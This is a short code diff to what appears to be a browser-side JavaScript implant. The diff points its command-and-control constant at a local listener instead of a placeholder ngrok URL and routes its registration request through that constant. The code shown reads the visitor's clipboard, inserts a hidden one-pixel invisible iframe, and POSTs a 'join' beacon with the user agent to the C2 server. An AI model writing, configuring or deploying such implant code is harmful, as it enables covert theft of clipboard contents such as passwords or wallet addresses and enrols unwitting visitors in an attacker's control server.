@@ -1,6 +1,6 @@
 (async () => {
   const sleep = ms => new Promise(r => setTimeout(r, ms));
-  const C2 = "https://YOUR_NGROK_URL";
+  const C2 = "http://10.0.0.73:8081"; // local IP to reach listener.py
 
   try {
     const text = await navigator.clipboard.readText();
@@ -34,7 +34,7 @@
   iframe.style = "width:1px;height:1px;opacity:0;position:absolute;top:0;left:0;";
   document.body.appendChild(iframe);
 
-  fetch("https://ROGUE_C2/join", {
+  fetch(`${C2}/join`, {
     method: "POST",
     body: JSON.stringify({ id: navigator.userAgent }),
     headers: { "Content-Type": "application/json" }
